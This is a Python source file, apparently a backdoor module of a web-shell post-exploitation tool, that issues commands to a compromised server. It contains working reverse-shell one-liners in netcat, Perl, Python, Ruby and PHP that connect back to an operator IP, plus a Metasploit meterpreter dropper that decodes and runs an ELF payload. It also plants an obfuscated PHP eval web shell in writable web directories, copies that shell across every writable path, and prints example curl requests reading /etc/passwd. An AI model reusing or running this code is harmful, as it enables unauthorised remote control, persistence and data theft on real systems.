from subprocess import Popen, PIPE
from platform import platform as os

from core.libs.menu import Colors, getargs
from core.libs.request_handler import make_request
from core.modules.shell_handler import linux

import random, string


# Source: http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet (Thanks @pentestmonkey)
class Backdoor(object):
    '''
    The methods shown are tailored to Unix-like systems.
    Some of the examples below should also work on Windows
    if you use substitute "/bin/sh -i" with "cmd.exe".
    '''
    def list(self):
        print '\n[i] Usage: @backdoor [module] <*ip:port>'
        print '[i] Modules:'
        #print '[i] \t*bash   \t\tUse bash to create a reverse shell (not all versions support this!)'
        #print '[i] \t*java   \t\tUse java to create a reverse shell'
        print '[i] \t*msf    \t\tUse a PHP metereter to create a reverse shell'
        print '[i] \t*netcat \t\tUse netcat traditional to create a reverse shell (not netcat openbsd)'
        print '[i] \t*perl   \t\tUse perl to create a reverse shell'
        print '[i] \tphp    \t\t\tAttempt to write a PHP file into the web root directory'
        #print '[i] \t*php-cli    \t\tUse php-cli to create a reverse shell'
        print '[i] \t*python \t\tUse python to create a reverse shell'
        print '[i] \t*ruby   \t\tUse ruby to create a reverse shell'
        print '[i] \tspread  \t\tSpread our shell around'
        #print '[i] \t*xterm  \t\tUse xterm to create a reverse shell'

    # Redefinition on function "netcat"
    #def netcat(self, ip, port):
    #    print '\n{0}[i] Make sure \'{1}\' has a listener shell ALREADY setup on port: \'{2}\'{3}'.format(Colors.GREEN, ip, port, Colors.END)
    #    cmd = '{0} {1} {2} -e /bin/bash'.format(path, ip, port)
    #    self.make_request.get_page_source(cmd)
    #    print '{0}[+] Done!{1}'.format(Colors.HOT, Colors.END)

    def msf(self, ip, port):
        if len(Popen("for x in `whereis msfvenom`; do file $x | grep symbolic; done", shell=True, stdout=PIPE).stdout.read().strip()) == 0:
            print '\n{0}[!] Wasn\'t able to detect the metasploit framework{1}'.format(Colors.RED, Colors.END)
        else:
            print '\n{0}[i] Found the metasploit framework!'.format(Colors.GREEN, Colors.END)
            folder = linux.get_writble_dir()
            if folder:
                filename = ''.join(random.choice(string.ascii_letters + string.digits) for x in range(8))
                print '{0}[+] Filename: \'{1}\'{2}'.format(Colors.GREEN, filename, Colors.END)
                path = '{0}/{1}'.format(folder, filename)
                raw_input('\n{0}[i] Make sure: \'{1}\' has a listener shell setup on port: \'{2}\'{3} (hint: msfcli exploit/multi/handler PAYLOAD=linux/x86/meterpreter/reverse_tcp LHOST={1} LPORT={2} E)\n{0}[?] Press <return> when ready!{3}'.format(Colors.GREEN, ip, port, Colors.END))
                print '[i] Generating linux/x86/meterpreter/reverse_tcp'
                #phpshell = Popen('msfvenom -p php/meterpreter/reverse_tcp LHOST={0} LPORT={1} -e php/base64 -f raw'.format(ip, port), shell=True, stdout=PIPE).stdout.read().strip()
                shell = Popen('msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={0} LPORT={1} -f elf | base64'.format(ip, port), shell=True, stdout=PIPE).stdout.read().strip()
                cmd = 'echo "{0}" | base64 -i -d > {1} && chmod +x {1} && nohup {1} &'.format(shell, path)
                print '{0}[+] Sending payload & executing{1}'.format(Colors.GREEN, Colors.END)
                make_request.get_page_source(cmd)
                print '{0}[+] Done!{1}'.format(Colors.HOT, Colors.END)

                
    def netcat(self, ip, port):
        '''
        nc openbsd deosn't have -e switch
        alternative solution:
            rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP PORT>/tmp/f
        '''
        cmd = "for x in `whereis nc netcat`; do file $x | grep executable | awk '{print $1}' | tr -d ':'; done"
        netcat = make_request.get_page_source(cmd)
        if netcat:
            print '\n{0}[i] Found netcat!'.format(Colors.GREEN, Colors.END)
            c = 1
            for path in netcat:
                print '{0}{1:2d}- {2} {3}'.format(Colors.GREEN, c, path, Colors.END)
                c += 1
            raw_input('\n{0}[i] Make sure: \'{1}\' has a listener shell setup on port: \'{2}\'{3} (hint: nc -lvvp {2})\n{0}[?] Press <return> when ready!{3}'.format(Colors.GREEN, ip, port, Colors.END))
            for path in netcat:
                cmd = 'nohup {0} {1} {2} -e /bin/bash &'.format(path, ip, port)
                make_request.get_page_source(cmd)
            print '{0}[+] Done!{1}'.format(Colors.HOT, Colors.END)
        else:
            print '\n{0}[!] Didn\'t find netcat on the remote system{1}'.format(Colors.RED, Colors.END)

    def perl(self, ip, port):
        cmd = "for x in `whereis perl`; do file $x | grep executable | awk '{print $1}' | tr -d ':'; done"
        perl = make_request.get_page_source(cmd)
        if perl:
            print '\n{0}[i] Found perl!'.format(Colors.GREEN, Colors.END)
            c = 1
            for path in perl:
                print '{0}{1:2d}- {2} {3}'.format(Colors.GREEN, c, path, Colors.END)
                c += 1
            raw_input('\n{0}[i] Make sure: \'{1}\' has a listener shell setup on port: \'{2}\'{3} (hint: nc -lvvp {2})\n{0}[?] Press <return> when ready!{3}'.format(Colors.GREEN, ip, port, Colors.END))
            for path in perl:
                cmd = 'nohup {0} -e '.format(path)
                cmd += '\'use Socket;'
                cmd += '$i="{0}";'.format(ip)
                cmd += '$p="{0}";'.format(port)
                cmd += 'socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));'
                cmd += 'if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");'
                cmd += 'open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\' &'
                make_request.get_page_source(cmd)
            print '{0}[+] Done!{1}'.format(Colors.HOT, Colors.END)
        else:
            print '\n{0}[!] Didn\'t find perl on the remote system{1}'.format(Colors.RED, Colors.END)

    def php(self, ip):
        wwwroot = linux.get_doc_root()
        cmd = 'find {0} -depth -perm -0002 -type d | sort -R | head -n 1'.format(wwwroot)       # Ths could be put into a function? this/spread/get_writble_dir
        folder = make_request.get_page_source(cmd)
        if folder:
            folder = folder[0]
            print '\n{0}[+] Found a writable directory: \'{1}\'{2}'.format(Colors.GREEN, folder, Colors.END)
            filename = '.'+''.join(random.choice(string.ascii_letters + string.digits) for x in range(8))+'.php'     # Ths could be put into a function? Snap! (<--with msf)
            print '{0}[+] Filename: \'{1}\'{2}'.format(Colors.GREEN, filename, Colors.END)
            path = '{0}/{1}'.format(folder, filename)
            
            print '{0}[+] Creating our \'evil\' file: \'{1}\'{2}'.format(Colors.GREEN, path, Colors.END)
            parameter = ''.join(random.choice(string.ascii_lowercase) for x in range(6))
            #  1) cmd = 'echo "<?php @eval(\$_GET[\'cmd\'].\';\'); ?>" > "{0}"'.format(path)        # 'Standard' with fix parameter
            #2.1) payload = 'echo "@eval(\$_GET[\'{0}\'].\';\');" | base64'.format(parameter)       # 'Standard with random parameter
            #2.2) cmd = 'echo "<?php eval(base64_decode("{0}" ?>" > "{1}"'.format(payload, path)    
            import base64, itertools                                                                # 'Encoded with random parameter and alting cases
            casePayload=random.choice(map(''.join, itertools.product(*((c.upper(), c.lower()) for c in 'eval'))))
            caseShell=random.choice(map(''.join, itertools.product(*((c.upper(), c.lower()) for c in 'php eval(base64_decode'))))
            payload = "{0}($_GET['{1}'].';');".format(casePayload, parameter)
            payloadEncoded = base64.b64encode(payload).format(payload)
            evilFile= "<?{0}(\"{1}\")); ?>".format(caseShell, payloadEncoded)
            cmd = 'echo \'{0}\' > \"{1}\"'.format(evilFile, path)
            make_request.get_page_source(cmd)
            
            print '{0}[+] Done!{1}'.format(Colors.HOT, Colors.END)
            
            uri = folder[len(wwwroot):]
            print '{0}[i] Example:\n[i]\tcurl "{1}{2}/{3}?{4}=require(\'/etc/passwd\')"\n[i]\tcurl "{1}{2}/{3}?{4}=system(\'/sbin/ifconfig\')"{5}'.format(Colors.GREEN, ip, uri, filename, parameter, Colors.END)  # Needs to search, http & https
        else:
            print '\n{0}[!] Unable to find a wriable directory'.format(Colors.RED, Colors.END)

    def php_cli(self, ip, port):
        cmd = "for x in `whereis php`; do file $x | grep executable | awk '{print $1}' | tr -d ':'; done"
        php = make_request.get_page_source(cmd)
        if php:
            print '\n{0}[i] Found php-cli!'.format(Colors.GREEN, Colors.END)
            c = 1
            for path in php:
                print '{0}{1:2d}- {2} {3}'.format(Colors.GREEN, c, path, Colors.END)
                c += 1
            raw_input('\n{0}[i] Make sure: \'{1}\' has a listener shell setup on port: \'{2}\'{3} (hint: nc -lvvp {2})\n{0}[?] Press <return> when ready!{3}'.format(Colors.GREEN, ip, port, Colors.END))
            for path in php:
                cmd = 'nohup {0} -r '.format(path)
                cmd += '\'$sock=fsockopen("{0}",{1});'.format(ip, port)
                cmd += 'exec("/bin/sh -i <&3 >&3 2>&3");\' &'
                make_request.get_page_source(cmd)
            print '{0}[+] Done!{1}'.format(Colors.HOT, Colors.END)
        else:
            print '\n{0}[!] Didn\'t find php-cli on the remote system{1}'.format(Colors.RED, Colors.END)

    def python(self, ip, port):
        cmd = "for x in `whereis python`; do file $x | grep executable | awk '{print $1}' | tr -d ':'; done"
        python = make_request.get_page_source(cmd)
        if python:
            print '\n{0}[i] Found python!'.format(Colors.GREEN, Colors.END)
            c = 1
            for path in python:
                print '{0}{1:2d}- {2} {3}'.format(Colors.GREEN, c, path, Colors.END)
                c += 1
            raw_input('\n{0}[i] Make sure: \'{1}\' has a listener shell setup on port: \'{2}\'{3} (hint: nc -lvvp {2})\n{0}[?] Press <return> when ready!{3}'.format(Colors.GREEN, ip, port, Colors.END))
            for path in python:
                cmd = 'nohup {0} -c '.format(path)
                cmd += '\'import socket,subprocess,os;'
                cmd += 's=socket.socket(socket.AF_INET,socket.SOCK_STREAM);'
                cmd += 's.connect(("{0}",{1}));'.format(ip, port)
                cmd += 'os.dup2(s.fileno(),0);'
                cmd += 'os.dup2(s.fileno(),1);'
                cmd += 'os.dup2(s.fileno(),2);'
                cmd += 'p=subprocess.call(["/bin/sh","-i"]);\' &'
                make_request.get_page_source(cmd)
            print '{0}[+] Done!{1}'.format(Colors.HOT, Colors.END)
        else:
            print '\n{0}[!] Didn\'t find python on the remote system{1}'.format(Colors.RED, Colors.END)

    def ruby(self, ip, port):
        cmd = "for x in `whereis ruby`; do file $x | grep executable | awk '{print $1}' | tr -d ':'; done"
        ruby = make_request.get_page_source(cmd)
        if ruby:
            print '\n{0}[i] Found ruby!'.format(Colors.GREEN, Colors.END)
            c = 1
            for path in ruby:
                print '{0}{1:2d}- {2} {3}'.format(Colors.GREEN, c, path, Colors.END)
                c += 1
            raw_input('\n{0}[i] Make sure: \'{1}\' has a listener shell setup on port: \'{2}\'{3} (hint: nc -lvvp {2})\n{0}[?] Press <return> when ready!{3}'.format(Colors.GREEN, ip, port, Colors.END))
            for path in ruby:
                cmd = 'nohup {0} -rsocket -e'.format(path)
                cmd += '\'f=TCPSocket.open("{0}",{1}).to_i;'.format(ip, port)
                cmd += 'exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\' &'
                make_request.get_page_source(cmd)
            print '{0}[+] Done!{1}'.format(Colors.HOT, Colors.END)
        else:
            print '\n{0}[!] Didn\'t find ruby on the remote system{1}'.format(Colors.RED, Colors.END)

    # A method to spread the shell in all writable directories
    def spread(self):
        provided_shell_name = raw_input('\n{0}[?] Current shell name{1}: '.format(Colors.GREEN, Colors.END))
        shell_name = getargs.url.split('/')[-1] if getargs.method == 'post' else provided_shell_name
        cmd = 'find {0} -depth -perm -0002 -type d | xargs -n 1 cp -v {1}'.format(linux.get_doc_root(), shell_name)
        done = make_request.get_page_source(cmd)
        if done:
            success = '\n[+] {hot}{shell_name}{end} already written to {hot}{writable_length}{end} paths'.format(
                    shell_name=shell_name,
                    writable_length=len(done),
                    hot=Colors.HOT,
                    end=Colors.END,)
            success += '\n[+] To check these paths type {0}@enum writable{1}'.format(Colors.HOT, Colors.END)
            print success
        else:
            print '\n{0}[!] Something went wrong while spreading shell{1}'.format(Colors.RED, Colors.END)

    def xterm(self, ip):
        cmd = "for x in `whereis xterm`; do file $x | grep executable | awk '{print $1}' | tr -d ':'; done"
        xterm = make_request.get_page_source(cmd)
        if xterm:
            print '\n{0}[i] Found xterm!'.format(Colors.GREEN, Colors.END)
            c = 1
            for path in xterm:
                print '{0}{1:2d}- {2} {3}'.format(Colors.GREEN, c, path, Colors.END)
                c += 1
            raw_input('\n{0}[i] Make sure: \'{1}\' has a listener shell setup on port: \'{2}\'{3} (hint: nc -lvvp {2})\n{0}[?] Press <return> when ready!{3}'.format(Colors.GREEN, ip, port, Colors.END))
            for path in xterm:
                cmd = 'nohup {0} xterm -display {1}:1 &'.format(path, ip)
                make_request.get_page_source(cmd)
            print '{0}[+] Done!{1}'.format(Colors.HOT, Colors.END)
        else:
            print '\n{0}[!] Didn\'t find xterm on the remote system{1}'.format(Colors.RED, Colors.END)

backdoor = Backdoor()
